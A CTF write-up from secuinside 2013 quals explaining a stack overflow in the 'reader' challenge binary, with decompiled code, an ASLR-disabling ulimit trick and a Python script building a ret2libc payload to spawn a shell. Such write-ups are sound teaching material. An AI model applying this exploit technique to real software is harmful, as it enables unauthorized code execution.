---
title: secuinside CTF 2013 quals reader writeup
author: kelwin
layout: post
permalink: /secuinside-ctf-2013-quals-reader-writeup/
categories:
  - CTF
  - writeup
---
We found several stack overflows in `reader`. One in the function of checking the filename and another in the function of parsing the file. But both functions are protected by stack cookies. The only function that does not contain stack cookie is as below:

    int __cdecl print_file(char *buffer)
    {
      unsigned int i; // [sp+18h] [bp-20h]@1
      char s[7]; // [sp+1Ch] [bp-1Ch]@1
      ……
      *((_DWORD *)buffer + 6) = &i;
      ……
      sub_8048C7A(buffer);
    }
    

We can see that the `buffer` pointer in the stack is passed to another function `sub_8048C7A` as below:

    int __cdecl sub_8048C7A(char *buffer)
    {
      ……
      len = strlen(buffer + 83);
      copy_str(*((char **)buffer + 6), (char *)ptr, len);
      ……
    }
    

`sub_8048C7A` will copy a string to the stack with incorrect length. So the return address of `print_file` can be overlapped. We can specify both the length and the string source contents by deliberately constructing the input file.

To get a shell, we used a simple ret2libc attack. To get precise address functions in glibc, we disable ASLR of shared library by a well-known ulimit trick.

    ulimit -s unlimited
    

Python script to construct the input file is as below:

    import struct
    
    def p(addr):
        return struct.pack("<I", addr)
    
    system_addr = p(0x4006b280)
    binsh_addr = p(0x40192ff8)
    ret2libc = system_addr + "aaaa" + binsh_addr
    
    f = open('exploit.sec', 'w')
    b = "\xff"+"SECUINSIDE"+"\x00"+"a"*12+"\x00"+"b"*15+"1234"+"a"*8+"c"*10+"b"*50+"\xff"*4
    b +='\x05\x00\x00\x00' # buffer1
    b +='\x32\x00\x00\x00' # buffer2
    b +='\x05\x00\x00\x00' # buffer3
    b +='\x10\x00\x00\x00'
    b +='\x01'
    b += 'a' * 5 
    b += 'a' * 36 + ret2libc + 'b'*(50 - len(ret2libc) - 36)
    b += 'a' * 5
    f.write(b)
    f.close